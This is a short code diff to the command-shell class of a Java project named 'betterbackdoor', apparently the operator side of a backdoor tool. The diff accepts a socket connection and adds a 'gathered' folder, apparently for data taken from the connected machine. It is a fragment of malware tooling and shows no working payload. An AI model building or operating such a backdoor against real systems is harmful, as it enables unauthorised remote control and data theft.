@@ -1,6 +1,8 @@
 package com.thatcherdev.betterbackdoor.shell;
 
 import com.thatcherdev.betterbackdoor.BetterBackdoor;
+
+import java.io.File;
 import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -27,6 +29,7 @@ public class Shell {
 			socket = serverSocket.accept();
 			in = new Scanner(socket.getInputStream());
 			out = new PrintWriter(socket.getOutputStream(), true);
+			new File("gathered").mkdir();
 			System.out.println("Connection has been established");
 			System.out.println("Enter 'help' for a list of available commands");
 			while (true)
